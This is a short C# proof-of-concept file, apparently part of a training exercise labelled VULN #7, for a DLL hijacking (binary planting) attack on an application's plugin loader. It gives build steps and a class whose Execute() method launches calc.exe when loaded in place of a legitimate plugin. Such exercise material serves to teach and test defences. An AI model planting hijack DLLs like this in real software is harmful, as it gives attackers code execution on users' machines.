// Malicious "plugin" for the DLL hijacking / binary planting exercise (VULN #7).
//
// Build:
//   dotnet new classlib -n ReportExporter -o .
//   (replace the generated Class1.cs with this file's contents, or just
//    drop this file in and delete Class1.cs)
//   dotnet build -c Release
//
// The resulting ReportExporter.dll, when placed in a directory that gets
// checked BEFORE c03e's own trusted Plugins\ folder (see
// Services/UpdateService.cs -> LoadPlugin), gets loaded and its Execute()
// method invoked in place of any legitimate plugin.
using System.Diagnostics;

namespace ReportExporter;

public static class EvilCode
{
    public static void Execute()
    {
        Process.Start("calc.exe");
    }
}
